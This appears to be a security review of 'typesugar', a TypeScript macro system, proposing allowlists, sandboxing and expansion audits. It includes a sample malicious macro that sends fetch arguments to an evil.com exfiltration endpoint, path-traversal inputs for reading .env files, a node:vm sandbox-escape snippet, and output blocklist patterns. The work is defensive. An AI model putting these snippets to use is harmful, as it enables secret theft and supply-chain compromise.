# Security Review: typesugar Macro System

**Date:** 2026-02-21
**Scope:** All macro execution paths, compile-time evaluation, file I/O, extension method resolution
**Severity scale:** CRITICAL / HIGH / MEDIUM / LOW / INFO

---

## Executive Summary

typesugar is a compile-time macro system — it rewrites TypeScript source code during compilation. This gives it a fundamentally different threat model from runtime libraries: **a compromised macro can rewrite any code that passes through the compiler**, and the developer may never see the rewritten output.

The current system has strong foundations (capability declarations, permission-gated comptime, expansion tracking) but lacks **enforcement boundaries**. Capabilities are advisory, not mandatory. The sandbox can be bypassed. There is no mechanism to detect when a macro produces unexpected output.

This review identifies 8 vulnerabilities across 3 severity tiers and proposes a layered defense model inspired by Rust (Watt), Racket (syntax taints), Scala 3 (staging), OCaml (ppxlib), and Zig (comptime restrictions).

---

## Threat Model

### Who are the adversaries?

| Actor                       | Vector                                                                 | Goal                                                        |
| --------------------------- | ---------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Malicious npm package**   | Third-party macro package in `node_modules`                            | Exfiltrate secrets, inject backdoors, cryptocurrency mining |
| **Supply chain compromise** | Compromised maintainer account publishes malicious update              | Same as above, at scale                                     |
| **Careless macro author**   | Overly broad macro that captures variables or reads files it shouldn't | Accidental data leakage, surprising behavior                |
| **Curious developer**       | Uses `comptime` to read `.env` or `~/.ssh/` during build               | Credential exfiltration via build logs                      |

### What is the attack surface?

```
                    ┌─────────────────────────────────┐
                    │    TypeScript Source Files       │
                    └──────────────┬──────────────────┘
                                   │
                    ┌──────────────▼──────────────────┐
                    │   Macro Transformer (ts-patch)   │
                    │                                  │
                    │  ┌──────────┐  ┌──────────────┐ │
                    │  │ Registry │  │  Comptime VM  │ │
                    │  │ (global) │  │  (node:vm)   │ │
                    │  └────┬─────┘  └──────┬───────┘ │
                    │       │               │         │
                    │  ┌────▼───────────────▼───────┐ │
                    │  │      MacroContext           │ │
                    │  │  - Full TypeChecker access  │ │
                    │  │  - AST factory              │ │
                    │  │  - File system (include*)   │ │
                    │  │  - Source file paths        │ │
                    │  └────────────────────────────┘ │
                    └──────────────┬──────────────────┘
                                   │
                    ┌──────────────▼──────────────────┐
                    │    Transformed JavaScript        │
                    │    (may contain injected code)    │
                    └─────────────────────────────────┘
```

---

## Findings

### F1: Unrestricted Macro Registration (CRITICAL)

**Location:** `src/core/registry.ts`

Any code that runs during TypeScript compilation can call `globalRegistry.register()` to add a macro. There is no authentication, signing, or allowlisting. A malicious `node_modules` package that is imported (even transitively) during compilation can register a macro that intercepts common patterns.

```typescript
// A malicious package could do this in its top-level module:
globalRegistry.register({
  kind: "expression",
  name: "fetch", // shadows the global fetch
  expand(ctx, callExpr, args) {
    // Rewrite fetch() to also send credentials to attacker's server
    return ctx.parseExpression(`
      (async () => {
        await fetch("https://evil.com/exfil", { method: "POST", body: JSON.stringify(${args[0]}) });
        return fetch(${args.map((a) => a.getText()).join(", ")});
      })()
    `);
  },
});
```

**The name-collision check (`kindMap.has(key)`) prevents overriding built-in macros** — but doesn't prevent registering macros with names that match user functions.

**Recommendation:** Introduce a macro allowlist in `typesugar.config.ts`. Only macros from explicitly trusted packages should be loaded. See [Proposed: Macro Allowlist](#proposed-macro-allowlist).

---

### F2: Path Traversal in Include Macros (CRITICAL)

**Location:** `src/macros/include.ts:63-66`

`resolveRelativePath` uses `path.resolve()` with no validation that the result stays within the project directory. Both relative traversal (`../../etc/passwd`) and absolute paths work.

```typescript
function resolveRelativePath(ctx: MacroContext, relativePath: string): string {
  const sourceDir = path.dirname(ctx.sourceFile.fileName);
  return path.resolve(sourceDir, relativePath); // No boundary check
}
```

An attacker in a dependency can use `includeStr("../../../.env")` to read secrets and embed them as string literals in the build output — which may then be shipped to production or logged.

**Recommendation:** Add a `projectRoot` boundary check:

```typescript
function resolveRelativePath(ctx: MacroContext, relativePath: string): string {
  const sourceDir = path.dirname(ctx.sourceFile.fileName);
  const resolved = path.resolve(sourceDir, relativePath);
  const projectRoot = getProjectRoot(ctx);
  if (!resolved.startsWith(projectRoot + path.sep)) {
    ctx.reportError(node, `Path traversal blocked: ${relativePath} resolves outside project root`);
    return sourceDir; // safe fallback
  }
  return resolved;
}
```

---

### F3: Comptime Sandbox Escape via `node:vm` (HIGH)

**Location:** `src/macros/comptime.ts`

The comptime sandbox uses Node.js `vm.createContext()`, which is [explicitly documented as not a security mechanism](https://nodejs.org/api/vm.html#vm_vm_createcontext_contextobject_options). Known escape techniques include:

1. **Prototype chain walking:** `this.constructor.constructor('return process')()` can access the host process
2. **Exposed globals:** `Object`, `Array`, `RegExp`, `Error` etc. all carry references to the host realm
3. **No path validation:** When `fs: "read"` is granted, absolute paths and `../` traversal are unrestricted

The sandbox provides `Math`, `Number`, `String`, `Boolean`, `Array`, `Object`, `Map`, `Set`, `JSON`, `Date`, `RegExp`, `Error` — all of which can be exploited for prototype chain attacks.

**Recommendation:** For untrusted code, replace `node:vm` with either:

- **Isolated-vm** (`npm:isolated-vm`) — V8 isolate with no host object leakage
- **QuickJS via wasm** — deterministic, no host access possible
- For trusted first-party code, `node:vm` is acceptable with the prototype chain hardened (freeze all sandbox globals)

---

### F4: Capabilities Are Advisory, Not Enforced (HIGH)

**Location:** `src/core/capabilities.ts`

The `createRestrictedContext()` proxy blocks property access on `MacroContext`, but:

1. **Default capabilities grant everything:** `DEFAULT_CAPABILITIES` has `needsTypeChecker: true`. The restriction only works if macros explicitly opt into less capability.
2. **The proxy doesn't deeply restrict:** A macro that gets `ctx.typeChecker` (which is allowed by default) has unrestricted access to the entire program's type information, including all file paths and source text.
3. **Capabilities aren't enforced at registration:** Nothing stops a macro from declaring `needsFileSystem: false` and then accessing the file system through `ctx.program.getSourceFile(path)`.

**Recommendation:** Invert the default — capabilities should be **deny by default**, with macros requesting what they need:

```typescript
export const DEFAULT_CAPABILITIES: Required<MacroCapabilities> = {
  needsTypeChecker: false, // Most syntactic macros don't need this
  needsFileSystem: false,
  needsProjectIndex: false,
  canEmitDiagnostics: true,
  maxTimeout: 5000,
};
```

This is a breaking change but aligns with the principle of least privilege.

---

### F5: No Macro Output Validation (HIGH)

**Location:** `src/transforms/macro-transformer.ts`

The transformer trusts macro output completely. There is no validation that:

- Output AST is well-formed
- Output doesn't introduce `eval()`, `Function()`, or `require()` calls
- Output doesn't reference `process.env`, `fs`, or network APIs
- Output matches the expected shape (e.g., an expression macro returning a statement)

This means a compromised macro can inject arbitrary runtime code that passes through the compiler undetected.

**Recommendation:** Implement an output validator that:

1. Checks for dangerous patterns (`eval`, `Function`, dynamic `require`/`import`)
2. Verifies AST shape matches macro kind
3. Optionally logs all expansions for audit (the `ExpansionTracker` exists but isn't used for security)

---

### F6: Unhygienic Escape Hatch (MEDIUM)

**Location:** `src/core/hygiene.ts:132-138`

`createUnhygienicIdentifier()` and `raw()` in quasiquotes allow macros to intentionally capture user-scope variables. This is a deliberate feature for advanced use cases, but:

1. There is no audit trail when unhygienic identifiers are created
2. Third-party macros can silently shadow user variables
3. No lint or diagnostic warns when a macro uses unhygienic names

**Recommendation:** Log unhygienic identifier creation in `ExpansionTracker`. Emit a diagnostic (suppressible) when a third-party macro uses `raw()` or `createUnhygienicIdentifier()`.

---

### F7: Config Files Execute Arbitrary Code (MEDIUM)

**Location:** `src/core/config.ts:145-178`

The config system loads `.ts` and `.js` config files via `cosmiconfig`, which executes them as Node.js modules. A `.typesugarrc.ts` file has full access to the host system. This is standard for JS tooling (ESLint, Prettier, etc.) but should be documented as a trust boundary.

**Recommendation:** Document that `typesugar.config.ts` is a trust boundary. Consider supporting JSON-only config for environments that need it (CI, sandboxed builds).

---

### F8: Extension Method Resolution Is Implicit and Silent (MEDIUM)

**Location:** `src/transforms/macro-transformer.ts` (extension resolution), `src/macros/extension.ts`

The transformer silently rewrites `value.method()` calls based on extension registries. A malicious package could register an extension that shadows a real method:

```typescript
// Malicious package registers:
registerStandaloneExtensionEntry({
  methodName: "toString",
  forType: "Object",
  qualifier: "MaliciousExt",
});
// Now obj.toString() → MaliciousExt.toString(obj) globally
```

The developer would see `obj.toString()` in their source but the compiled output would call a different function entirely.

**Recommendation:** Emit an `INFO` diagnostic when extension methods shadow built-in methods. Provide `--typesugar-verbose` flag that shows all rewrites.

---

## How Other Languages Handle This

### The Security Spectrum

```
Most Restrictive                                        Least Restrictive
      │                                                        │
      ▼                                                        ▼
   Zig comptime    OCaml PPX    Scala 3    Racket    Nim    Rust    npm
   (pure compute)  (AST→AST)   (staged)   (layered)  (VM)  (native) (yolo)
```

### Zig: No IO, No Escape (Aspirational Model)

Zig's comptime is the most restrictive: **no file system, no network, no system calls**. Comptime can only do pure computation on values known at compile time. For anything that needs IO, Zig delegates to `build.zig` — a separate process with explicit trust.

**Applicable to typesugar:** Most macros (`specialize`, `derive`, `typeclass`, `operators`) are pure AST→AST transforms that don't need IO. Only `comptime()` and `include*()` need file access. This natural split maps to two trust tiers.

### Rust Watt: WASM Sandboxing for Proc Macros

Watt compiles proc macros to WebAssembly and runs them in a safe runtime. The runtime is 100% safe Rust with zero dependencies. Macros can _only_ consume and produce token streams — no filesystem, no network.

**Applicable to typesugar:** Third-party typesugar macros could be compiled to WASM and run in a QuickJS/isolated-vm sandbox. The interface is "AST in, AST out" — identical to how macros already work.

### Rust cargo-vet: Audit-Based Supply Chain Security

Mozilla's `cargo-vet` tracks which crate versions have been audited and by whom. CI can block unaudited dependencies from entering the build. Organizations can share audit databases.

**Applicable to typesugar:** A `typesugar-vet` tool could track which macro packages have been audited, with CI integration to block unaudited macro packages.

### Racket: Syntax Taints and Phase Separation

Racket's macro system has the richest security model:

1. **Phase separation:** Code at compile-time (phase 1) and runtime (phase 0) cannot share mutable state
2. **Syntax taints:** AST nodes from untrusted macros are "tainted" — they cannot be used as bindings or in security-sensitive positions without explicit "arming"
3. **Code inspectors:** Hierarchical access control for module internals
4. **Custodians:** Resource limits (memory, time) on macro expansion

**Applicable to typesugar:** Taint tracking is the most valuable idea. AST nodes produced by third-party macros could carry a taint marker. The transformer would flag (or reject) tainted nodes that introduce `eval()`, `require()`, or other dangerous patterns.

### Scala 3: Progressive Disclosure and Staging

Scala 3 has three levels of metaprogramming, each more powerful (and more auditable) than the last:

1. **`inline` methods:** Guaranteed inlining, no AST manipulation. Like typesugar's `specialize()`
2. **`inline` + `scala.compiletime`:** Type-level computation only. Like typesugar's `@deriving`
3. **`macro` methods:** Full AST manipulation, but must call pre-compiled code (no self-referential macros)

The **level rule** ensures compile-time and runtime code can't accidentally mix. The `-Xcheck-macros` flag adds runtime verification during development.

**Applicable to typesugar:** typesugar already has a natural progressive disclosure: `specialize` < `@deriving` < `defineExpressionMacro` < `comptime`. Formalizing these as security tiers would help developers reason about trust.

### OCaml PPX: Driver-Mediated, Context-Free Preferred

ppxlib strongly encourages **context-free transformations** — macros that can only see and modify a single AST node, not the whole file. The driver mediates all interaction, preventing macros from interfering with each other.

**Applicable to typesugar:** typesugar's macro kinds (Expression, Attribute, Derive, etc.) already impose locality constraints. Formalizing that Expression macros can only see their arguments (not the surrounding scope) would close information leakage.

---

## Proposed Architecture: Layered Defense

### Layer 1: Macro Trust Tiers

Formalize the existing progressive disclosure as security tiers:

| Tier                     | Macros                                        | Capabilities                                  | Trust Level            |
| ------------------------ | --------------------------------------------- | --------------------------------------------- | ---------------------- |
| **Tier 0: Pure**         | `specialize`, `@operators`, `@tailrec`        | AST→AST only. No type checker, no file IO     | Any package            |
| **Tier 1: Type-Aware**   | `@deriving`, `summon`, `@typeclass`           | Type checker queries. No file IO, no code gen | Any package            |
| **Tier 2: Code Gen**     | `@reflect`, `quote()`, `defineSyntaxMacro`    | AST construction, hygiene system              | Audited packages       |
| **Tier 3: IO**           | `comptime({fs})`, `includeStr`, `includeJson` | File system, environment                      | First-party only       |
| **Tier 4: Unrestricted** | Custom macros with `needsFileSystem: true`    | Everything                                    | Explicitly allowlisted |

The transformer enforces tier boundaries: a Tier 0 macro cannot access `ctx.typeChecker`. A Tier 1 macro cannot call `ctx.parseExpression()`.

### Layer 2: Macro Allowlist

Add to `typesugar.config.ts`:

```typescript
export default {
  security: {
    // Only these packages may register macros
    allowedMacroPackages: [
      "@typesugar/*", // all first-party
      "@my-org/custom-macro", // explicitly trusted third-party
    ],

    // Block these patterns in macro output
    blockedOutputPatterns: ["eval(", "new Function(", "require('child_process')"],

    // Maximum expansion depth (prevent infinite recursion)
    maxExpansionDepth: 50,

    // Require explicit opt-in for IO macros
    requireExplicitIOPermission: true,
  },
};
```

### Layer 3: Expansion Audit Log

Extend `ExpansionTracker` to produce a machine-readable audit log:

```jsonc
// .typesugar-audit.json (generated per build)
{
  "version": 1,
  "timestamp": "2026-02-21T10:00:00Z",
  "files": {
    "src/app.ts": {
      "expansions": [
        {
          "macro": "specialize",
          "package": "@typesugar/specialize",
          "tier": 0,
          "line": 42,
          "original": "specialize(add)(1, 2)",
          "expanded": "1 + 2",
          "hygienicEscapes": 0,
        },
      ],
    },
  },
}
```

This log can be:

- Diffed in PRs to catch unexpected macro behavior changes
- Checked in CI to detect new macro registrations
- Reviewed manually for sensitive code paths

### Layer 4: `--typesugar-expand` CLI Flag

A `cargo expand` equivalent that shows what macros did to your code:

```bash
# Show all macro expansions in a file
npx typesugar expand src/app.ts

# Show only expansions from third-party macros
npx typesugar expand src/app.ts --third-party-only

# Diff original vs expanded
npx typesugar expand src/app.ts --diff
```

This is the single most important detection tool. If developers can easily see what macros did, they can catch unexpected rewrites.

### Layer 5: Path Sandboxing for File Access

All file-reading macros (`includeStr`, `includeBytes`, `includeJson`, `comptime` with `fs`) should be restricted to the project directory:

```typescript
function assertWithinProject(resolved: string, projectRoot: string): void {
  const normalized = path.normalize(resolved);
  if (!normalized.startsWith(projectRoot + path.sep) && normalized !== projectRoot) {
    throw new Error(
      `Security: path "${resolved}" is outside project root "${projectRoot}". ` +
        `File access is restricted to the project directory.`
    );
  }
}
```

### Layer 6: Comptime Sandbox Hardening

For the `node:vm` sandbox:

1. **Freeze all globals** before passing to the sandbox context
2. **Remove constructor chains:** `Object.create(null)` for the sandbox base
3. **Block `this.constructor.constructor`** pattern
4. **Add a `--typesugar-comptime-isolate` flag** that uses `isolated-vm` instead of `node:vm`

```typescript
function createHardenedSandbox(permissions: ComptimePermissions): vm.Context {
  const sandbox = Object.create(null);

  // Frozen copies of safe globals
  sandbox.Math = Object.freeze({ ...Math });
  sandbox.JSON = Object.freeze({
    parse: JSON.parse,
    stringify: JSON.stringify,
  });
  sandbox.Number = Number; // frozen at prototype level
  sandbox.String = String;
  // ... etc

  // No access to constructor chains
  Object.defineProperty(sandbox, "constructor", {
    value: undefined,
    writable: false,
  });

  return vm.createContext(sandbox, {
    codeGeneration: { strings: false, wasm: false },
  });
}
```

---

## Implementation Priority

| Priority | Item                                   | Effort           | Impact                                 |
| -------- | -------------------------------------- | ---------------- | -------------------------------------- |
| **P0**   | Path sandboxing in include macros (F2) | Small            | Blocks arbitrary file read             |
| **P0**   | `--typesugar-expand` CLI tool          | Medium           | Primary detection mechanism            |
| **P1**   | Macro allowlist in config (F1)         | Medium           | Blocks malicious packages              |
| **P1**   | Comptime sandbox hardening (F3)        | Medium           | Prevents sandbox escape                |
| **P1**   | Expansion audit log                    | Medium           | CI-reviewable record of macro behavior |
| **P2**   | Invert default capabilities (F4)       | Small (breaking) | Least privilege by default             |
| **P2**   | Macro output validation (F5)           | Medium           | Catches injected dangerous patterns    |
| **P2**   | Unhygienic escape logging (F6)         | Small            | Audit trail for variable capture       |
| **P3**   | Macro trust tiers                      | Large            | Comprehensive trust model              |
| **P3**   | Taint tracking on AST nodes            | Large            | Racket-inspired deep defense           |
| **P3**   | WASM sandbox for third-party macros    | Large            | Watt-inspired isolation                |

---

## Detection: How to Know When Macros Rewrite Code Unexpectedly

This is the core question. Here's the approach, from simplest to most sophisticated:

### 1. `typesugar expand` (cargo expand equivalent)

Show the developer exactly what the compiler sees after macro expansion. This is how Rust developers audit proc macros. No macro can hide from this — the expanded output is the ground truth.

### 2. Expansion diff in CI

Generate the audit log on every build. In CI, diff against the previous build:

```yaml
# GitHub Actions
- name: Check macro expansions
  run: |
    npx typesugar expand --audit > .typesugar-audit.json
    git diff --exit-code .typesugar-audit.json || {
      echo "::warning::Macro expansions changed — review .typesugar-audit.json"
      exit 1
    }
```

### 3. Blocklist patterns in output

A lightweight static analysis on macro output. Won't catch sophisticated attacks but catches the obvious ones:

```typescript
const DANGEROUS_PATTERNS = [
  /\beval\s*\(/,
  /\bnew\s+Function\s*\(/,
  /\brequire\s*\(\s*['"]child_process['"]\s*\)/,
  /\brequire\s*\(\s*['"]fs['"]\s*\)/,
  /\bprocess\.env\b/,
  /\bfetch\s*\(\s*['"]https?:\/\//,
];
```

### 4. Taint tracking (advanced)

Mark AST nodes produced by third-party macros with a `__tainted` symbol property. The transformer checks tainted nodes against a policy:

- Tainted nodes cannot introduce new `import` statements
- Tainted nodes cannot reference `process`, `require`, `fs`, `child_process`
- Tainted nodes that introduce identifiers emit an INFO diagnostic

---

## Comparison with Existing JS/TS Ecosystem

| Tool               | Trust Model                                     | typesugar Equivalent                     |
| ------------------ | ----------------------------------------------- | ---------------------------------------- |
| Babel plugins      | Unrestricted. Plugins are trusted implicitly.   | Current state — all macros trusted       |
| SWC plugins        | WASM-sandboxed. Plugins run in a V8 isolate.    | Proposed Layer 5 (WASM sandbox)          |
| ESLint plugins     | Unrestricted, but read-only (can't modify code) | Not applicable — macros must modify code |
| TypeScript plugins | Limited to language service, can't modify emit  | typesugar macros are more powerful       |
| Deno permissions   | `--allow-read`, `--allow-net` etc.              | Proposed macro allowlist + tier system   |
| pnpm `allowBuilds` | Explicit allowlist for lifecycle scripts        | Proposed `allowedMacroPackages`          |

---

## Next Steps

1. **Immediate:** Fix path traversal in `include.ts` (P0, small change)
2. **This sprint:** Build `typesugar expand` CLI tool (P0, enables all other detection)
3. **Next sprint:** Macro allowlist + comptime hardening (P1)
4. **Backlog:** Trust tiers, taint tracking, WASM sandbox (P2-P3)

The single highest-ROI item is `typesugar expand`. If developers can see what macros produce, they can reason about trust. Everything else is defense-in-depth.
